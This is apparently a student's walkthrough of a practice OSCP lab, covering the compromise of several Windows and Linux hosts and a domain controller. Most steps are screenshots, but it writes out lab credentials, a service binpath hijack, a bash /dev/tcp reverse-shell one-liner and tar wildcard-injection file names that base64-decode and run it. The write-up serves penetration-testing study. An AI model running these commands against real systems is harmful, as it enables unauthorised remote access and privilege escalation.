# OSCP C

## Network

**Given:**

- 192.168.167.153 MS01
- 192.168.167.155 
- 192.168.167.156 
- 192.168.167.157 

**Found:**

- 10.10.127.152 DC01
- 10.10.127.153 MS02

## Creds

```
eric.wallows:EricLikesRunning800 (given credentials for 192.168.127.153)
web_svc:Diamond1
administrator:December31 (local admin on MS01)

other users:
tom_admin
```

## 192.168.167.155

### Enumeration

![](assets/Pasted%20image%2020250222001113.png)

### Initial Access

We search for a Mobile Mouse Server exploit.

![](assets/Pasted%20image%2020250222004346.png)

We get the script. I had to fix the line breaks. We need an HTTP server to serve the reverse shell created with msfvenom and a listener.

![](assets/Pasted%20image%2020250222004437.png)

And run the script.

![](assets/Pasted%20image%2020250222004508.png)

### Privilege Escalation

![](assets/Pasted%20image%2020250222005317.png)

Transfer winpeas to the host.

![](assets/Pasted%20image%2020250222013715.png)

We have insecure permissions on a service. We can change the binary path to a malicious file and restart the service.

![](assets/Pasted%20image%2020250222013810.png)

Transfer the reverse shell, start a listener, and:

```bash
sc config GPGOrchestrator binpath="C:\users\tim\revshell2.exe"
sc stop GPGOrchestrator
sc start GPGOrchestrator
```

![](assets/Pasted%20image%2020250222015024.png)

### Post Exploitation

![](assets/Pasted%20image%2020250222015047.png)

## 192.168.167.156

### Enumeration

![](assets/Pasted%20image%2020250222132947.png)

![](assets/Pasted%20image%2020250222163505.png)

### Initial Access

![](assets/Pasted%20image%2020250222165558.png)

![](assets/Pasted%20image%2020250222164738.png)

We have Jack@oscp and then a reset password for Jack.
Going to 192.168.177.156:8083, we have the Vesta panel login.

![](assets/Pasted%20image%2020250222165700.png)

Trying `Jack:3PUKsX98BMupBiCf`.

![](assets/Pasted%20image%2020250222170704.png)

Searching, I found vestaroot.py https://github.com/rekter0/exploits/blob/master/VestaCP/vestaROOT.py.

![](assets/Pasted%20image%2020250222172303.png)

### Post Exploitation

![](assets/Pasted%20image%2020250222172209.png)

## 192.168.167.157

### Enumeration

![](assets/Pasted%20image%2020250223003108.png)

We can log in as anonymous in the FTP. Inside, there is a bunch of PDF templates. Using exiftools, we can get some usernames.

![](assets/Pasted%20image%2020250223121813.png)

### Initial Access

Port 20000 shows a Usermin login page.

![](assets/Pasted%20image%2020250223003853.png)

We can try to use the usernames we have.

`cassie:cassie` works.

![](assets/Pasted%20image%2020250223122649.png)

Use the command shell function.

![](assets/Pasted%20image%2020250223122823.png)

Make a reverse shell with msfvenom and transfer it with a Python server and wget.
Start an nc listener and execute the reverse shell.

![](assets/Pasted%20image%2020250223124944.png)

### Privilege Escalation

![](assets/Pasted%20image%2020250223125040.png)

We can see a crontab file called every 2 minutes.

![](assets/Pasted%20image%2020250223205640.png)

![](assets/Pasted%20image%2020250223205722.png)

Tar uses a wildcard, and this can be abused to execute commands.

We need to create two files in /opt/admin. First, encode the reverse shell:

```bash
echo -n "bash -i >& /dev/tcp/192.168.45.229/5555 0>&1" | base64
```

```bash
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIyOS81NTU1IDA+JjE= | base64 -d | bash'"
```

Start a listener on 5555 and wait for the cron task to execute.

![](assets/Pasted%20image%2020250223205957.png)

### Post Exploitation

![](assets/Pasted%20image%2020250223205532.png)

## 192.168.167.153 MS01

### Enumeration

![](assets/Pasted%20image%2020250223232421.png)

### Initial Access

We use the provided credentials `eric.wallows:EricLikesRunning800`.

### Privilege Escalation

Transfer adpeas.ps1 and get important info.

![](assets/Pasted%20image%2020250223233954.png)

![](assets/Pasted%20image%2020250223234013.png)

![](assets/Pasted%20image%2020250223234021.png)

Open an SSH tunnel.

![](assets/Pasted%20image%2020250224003536.png)

Perform a Kerberoast attack.

![](assets/Pasted%20image%2020250224003620.png)

Using hashcat.

![](assets/Pasted%20image%2020250224003649.png)

Making a ping sweep gets us the third machine.

![](assets/Pasted%20image%2020250224004858.png)

In the Erik folder, we see an admintool.exe program. If we execute it and put a password, debug is enabled and shows the password comparison in MD5 hash. We can use hashcat to get it.

![](assets/Pasted%20image%2020250224130434.png)

![](assets/Pasted%20image%2020250224130451.png)

### Post Exploitation

We enter as administrator with the password we got.

![](assets/Pasted%20image%2020250224130738.png)

Checking admin PS history, we have a password.

![](assets/Pasted%20image%2020250224220714.png)

Checking with CME.

![](assets/Pasted%20image%2020250225183434.png)

## 10.10.127.154 MS02

### Enumeration

![](assets/Pasted%20image%2020250224190333.png)

### Initial Access

Using credentials found in MS01.

![](assets/Pasted%20image%2020250225185419.png)

### Post Exploitation

There is a windows.old on C:, so we download SAM and SYSTEM using Evil-WinRM embedded download.

![](assets/Pasted%20image%2020250225191341.png)

![](assets/Pasted%20image%2020250225191353.png)

Using impacket-secretsdump.

![](assets/Pasted%20image%2020250225191446.png)

We know that tom_admin can perform DCSync to the DC, so we can secretsdump with his hash.

## 10.10.127.152 DC01

### Enumeration

![](assets/Pasted%20image%2020250224192057.png)

### Initial Access

We have the hash for tom_admin, so we perform a DCSync to the DC.

![](assets/Pasted%20image%2020250225192218.png)

Using the hash:

![](assets/Pasted%20image%2020250225192419.png)
